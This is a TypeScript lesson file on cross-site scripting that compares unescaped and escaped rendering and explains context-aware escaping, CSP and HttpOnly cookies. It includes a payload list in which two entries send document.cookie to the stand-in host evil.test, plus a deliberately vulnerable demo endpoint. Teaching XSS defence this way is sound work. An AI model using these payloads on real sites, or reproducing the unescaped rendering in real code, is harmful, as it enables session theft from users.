/**
 * Cross-Site Scripting
 * =====================
 * Injection again, with the browser as the interpreter instead of the database.
 * Untrusted input reaches the page as markup rather than as text, and the
 * attacker's JavaScript runs with your origin's privileges: their script can
 * read your cookies, call your API as the logged-in user, and rewrite the page.
 *
 * Three shapes:
 *
 *   Reflected  — the payload is in the request and comes straight back in the
 *                response. Needs the victim to follow a crafted link.
 *   Stored     — the payload is saved (a comment, a display name) and served to
 *                everyone who loads the page. Much worse: no link required.
 *   DOM-based  — the server is innocent; client JavaScript writes untrusted
 *                data into innerHTML or similar.
 *
 * Run:  npx tsx 03_xss.ts            (prints the comparison and exits)
 *       DEMO=serve npx tsx 03_xss.ts (serves the vulnerable + safe pages on :8133)
 */

import { fileURLToPath } from "node:url";

import express from "express";
import helmet from "helmet";

const PORT = 8133;

// The canonical set. The first is the textbook one; the rest are why "strip
// <script> tags" is not a strategy.
const PAYLOADS: { name: string; value: string }[] = [
  { name: "script tag", value: `<script>fetch('//evil.test?c='+document.cookie)</script>` },
  { name: "img onerror", value: `<img src=x onerror="fetch('//evil.test?c='+document.cookie)">` },
  { name: "svg onload", value: `<svg onload="alert(document.domain)">` },
  { name: "attribute break-out", value: `" onmouseover="alert(1)` },
  { name: "javascript: url", value: `javascript:alert(document.domain)` },
];

// ---------------------------------------------------------------------------
// Escaping
// ---------------------------------------------------------------------------
// Context decides the escaping. These five characters are the HTML *text*
// context — between tags. The same string placed in an attribute, a URL, or
// inside a <script> block needs different treatment, which is the single most
// important thing to understand about XSS defence.
function escapeHtml(value: string): string {
  return value
    .replace(/&/g, "&amp;") // first, or it double-escapes the others
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function renderUnsafe(name: string): string {
  return `<p>Hello, ${name}!</p>`;
}

function renderSafe(name: string): string {
  return `<p>Hello, ${escapeHtml(name)}!</p>`;
}

function compare(): void {
  console.log("\n--- The same payloads, escaped and not ---");
  for (const { name, value } of PAYLOADS) {
    console.log(`\n  ${name}`);
    console.log(`    input:    ${value}`);
    console.log(`    UNSAFE →  ${renderUnsafe(value)}`);
    console.log(`    SAFE   →  ${renderSafe(value)}`);
  }
  console.log("\n  In the safe column every payload is text the user sees, which is");
  console.log("  what they asked for by typing it. Nothing is parsed as markup.");
}

function contexts(): void {
  console.log("\n--- Escaping depends on where the value lands ---");
  console.log(`
  HTML text          <p>{{ value }}</p>
      escapeHtml above. Five characters.

  HTML attribute     <input value="{{ value }}">
      Same escaping, AND the attribute must be quoted. Unquoted, a space is
      enough to add a new attribute — no < or > needed:

          <input value={{ value }}>   with value = "x onfocus=alert(1) autofocus"

  URL                <a href="{{ value }}">
      escapeHtml does nothing useful here: javascript:alert(1) contains none of
      the five characters. Parse it and check the scheme:

          const url = new URL(value, base);
          if (url.protocol !== "https:" && url.protocol !== "http:") reject();

  Inside <script>    <script>const x = "{{ value }}";</script>
      Do not. There is no reliable escaping for this context — </script> inside
      a string literal still ends the block. Put the data in the DOM and read
      it back:

          <script type="application/json" id="data">{{ jsonEscaped }}</script>
          JSON.parse(document.getElementById("data").textContent)

  CSS                <div style="{{ value }}">
      Also do not. Use classes.

  The practical version of all this: use a template engine that escapes by
  default and know which one character turns it off. Nunjucks (in
  ../../email-concepts/) escapes {{ x }} and does not escape {{ x | safe }}.
  React escapes everything except dangerouslySetInnerHTML — a name chosen to
  make you type it deliberately. Grep your codebase for those two today.`);
}

function defenceInDepth(): void {
  console.log("\n--- What catches the one you missed ---");
  console.log(`
  Content-Security-Policy (see 01)
      script-src 'self' means the img onerror payload above does not execute
      even when it reaches the page. This is the highest-value control you can
      add without touching application code, and its value is roughly zero if
      you also set 'unsafe-inline'.

  HttpOnly cookies
      A session cookie marked HttpOnly is invisible to document.cookie, so the
      exfiltration in these payloads returns nothing. It does not stop the
      script calling your API as the user — the browser still attaches the
      cookie — so this narrows the blast radius rather than closing it.

  Sanitising rich text
      When users genuinely need to submit HTML, escaping is not an option and
      you need a real sanitiser with an allowlist of tags and attributes.
      DOMPurify is the one to use. A regex is not a sanitiser; every regex-based
      HTML filter has a bypass, usually several.

  Type the boundary
      Zod-validating that a "username" matches /^[a-zA-Z0-9_]{3,20}$/ makes
      every payload here impossible for that field. Not a general defence, but
      most fields are not free text and most codebases never check.`);
}

// ---------------------------------------------------------------------------
// Optional live servers, for seeing it happen in a browser.
// ---------------------------------------------------------------------------
function serve(): void {
  const app = express();

  const page = (title: string, body: string): string =>
    `<!doctype html><html><head><title>${title}</title></head><body>
     <h1>${title}</h1>
     <form><input name="name" placeholder="try: <img src=x onerror=alert(1)>" size="50"><button>go</button></form>
     ${body}</body></html>`;

  // No helmet, no escaping.
  app.get("/vulnerable", (req, res) => {
    const name = String(req.query.name ?? "world");
    res.send(page("Vulnerable", renderUnsafe(name)));
  });

  // Escaped output only.
  app.get("/escaped", (req, res) => {
    const name = String(req.query.name ?? "world");
    res.send(page("Escaped", renderSafe(name)));
  });

  // Not escaped, but a CSP blocks execution — defence in depth, visible.
  app.get(
    "/csp-only",
    helmet({ contentSecurityPolicy: { directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"] } } }),
    (req, res) => {
      const name = String(req.query.name ?? "world");
      res.send(page("Unescaped, but CSP on", renderUnsafe(name)));
    }
  );

  app.listen(PORT, () => {
    console.log(`\nserving on http://localhost:${PORT}`);
    console.log(`  /vulnerable  — payload runs`);
    console.log(`  /escaped     — payload is displayed as text`);
    console.log(`  /csp-only    — payload is in the HTML, browser refuses to run it`);
    console.log(`\nOpen the console on /csp-only to see the CSP violation reported.`);
    console.log(`Ctrl-C to stop.`);
  });
}

function main(): void {
  console.log("=== Cross-Site Scripting ===");
  if (process.env.DEMO === "serve") {
    serve();
    return;
  }
  compare();
  contexts();
  defenceInDepth();
  console.log("\nRun with DEMO=serve to try the payloads in a real browser.");
  console.log("Next: 04_csrf.ts");
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
  main();
}

export { escapeHtml, renderSafe, renderUnsafe };
